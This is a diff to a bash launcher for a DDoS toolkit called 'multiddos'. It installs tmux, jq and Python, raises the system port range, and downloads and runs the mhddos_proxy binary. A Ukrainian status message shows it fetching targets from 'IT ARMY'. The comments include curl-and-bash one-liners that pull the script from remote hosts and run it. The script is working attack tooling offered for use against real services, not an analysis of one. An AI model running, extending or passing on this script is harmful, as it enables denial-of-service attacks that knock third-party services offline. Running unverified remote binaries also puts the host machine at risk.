@@ -1,11 +1,13 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.21a\n"
+clear && echo -e "Loading... v1.21b\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-rm -rf ~/multidd*; mkdir -p ~/multidd/targets/ ; cd ~/multidd # clean working folder 
+rm -rf ~/multidd*; mkdir -p ~/multidd/targets/ ; cd ~/multidd # clean working folder
+
+sudo sysctl -w net.ipv4.ip_local_port_range="16384 65535" # increasing thread limit
 
 gotop="on"
 db1000n="off"
@@ -63,8 +65,7 @@ toilet -t --metal " MULTIDDOS"
 
 if [[ $mhddos_mode == "new" ]]; then
     cd ~/multidd/
-    wget -q https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
-    chmod +x mhddos_proxy_linux
+    wget -q https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux && chmod +x mhddos_proxy_linux&
     typing_on_screen 'Шукаю завдання від IT ARMY...' ; sleep 1
 
 else
@@ -139,7 +140,6 @@ cat > auto_bash.sh << 'EOF'
 # pkill -f mhddos_proxy_linux
 
 if [[ $mhddos_mode == "new" ]]; then
-    sudo sysctl -w net.ipv4.ip_local_port_range="16384 65535"
     cd ~/multidd/
 
     if [[ $ddos_size == "XS" ]]; then
